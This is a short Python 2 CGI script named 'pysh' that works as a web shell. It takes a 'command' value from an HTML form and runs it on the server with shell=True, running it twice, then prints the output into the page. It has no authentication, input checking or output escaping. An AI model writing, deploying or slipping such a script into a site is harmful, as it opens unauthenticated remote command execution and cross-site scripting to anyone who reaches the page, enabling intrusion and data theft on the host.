#!/usr/bin/env python

import cgi, shlex
import cgitb; cgitb.enable()  # for troubleshooting
import subprocess

print "Content-type: text/html"
print

print """
<html>

<head><title>pysh</title></head>

<body>
"""

form = cgi.FieldStorage()
command = form.getvalue("command", "")

print """
  <div>$ %s</div>
  <div> 
    <form>
      <p>$ <input type="text" name="command"/></p>
    </form>
  </div>
  
""" % shlex.split(command)
subprocess.call(command, shell=True)
print """
  <div>$ %s</div>
    
</body>


</html>
""" % subprocess.check_output(command, shell=True)